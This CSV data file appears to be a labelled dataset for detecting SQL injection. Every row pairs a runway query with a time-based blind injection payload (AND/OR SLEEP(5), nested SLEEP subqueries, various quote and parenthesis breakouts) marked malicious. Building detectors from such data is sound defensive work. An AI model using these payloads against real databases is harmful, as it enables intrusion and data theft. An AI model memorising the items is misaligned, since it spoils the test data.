full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 2291=2291 AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 6037=6037 AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT RODS WHERE 5486=5486 AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS bdSK WHERE 8872=8872 AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS wKYV WHERE 6612=6612 AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 8029=8029 AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 9077=9077 AND SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') WHERE 5449=5449 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") WHERE 3787=3787 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' WHERE 8666=8666 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" WHERE 9345=9345 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x4d655459 WHERE 6989=6989 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x4552494b FROM DUAL WHERE 2432=2432 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'+(SELECT 0x47654f45 WHERE 5152=5152 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x4f745763 FROM DUAL WHERE 1511=1511 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x7967786b WHERE 9861=9861 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT 0x784c5041 WHERE 4830=4830 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AS bvrp WHERE 5152=5152 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AS NydU WHERE 3227=3227 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AS lVRl WHERE 3597=3597 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AS ufcj WHERE 6107=6107 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 7641=7641 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 6061=6061 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT tbGM WHERE 4660=4660 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS hViS WHERE 1058=1058 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS iohb WHERE 7611=7611 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 5984=5984 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 9763=9763 OR SLEEP(5)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'))) AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport%' AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport""))) AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') WHERE 2887=2887 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") WHERE 2263=2263 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport' WHERE 3968=3968 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"" WHERE 8137=8137 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x534d7042 WHERE 8144=8144 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'||(SELECT 0x6a625549 FROM DUAL WHERE 5304=5304 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport'+(SELECT 0x454d4f62 WHERE 8853=8853 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x42744641 FROM DUAL WHERE 3802=3802 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport||(SELECT 0x7667456d WHERE 1297=1297 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT 0x4f4b7668 WHERE 2024=2024 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport')) AS tgxH WHERE 5664=5664 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"")) AS gEHY WHERE 6457=6457 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport') AS fKWi WHERE 6699=6699 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport"") AS vfoE WHERE 9682=9682 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport))) AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) WHERE 4815=4815 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport WHERE 8216=8216 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport+(SELECT ztCj WHERE 8938=8938 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport)) AS yeaB WHERE 3277=3277 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport) AS LsPY WHERE 6382=6382 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport` WHERE 8897=8897 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airporf_ref = (SELECT id FROM airports WHERE name = ""BucksAirport`) WHERE 9907=9907 AND (SELECT 1994 FROM (SELECT(SLEEP(5)))JCKn)#"");",1,airport-S12,Unknown,Unknown
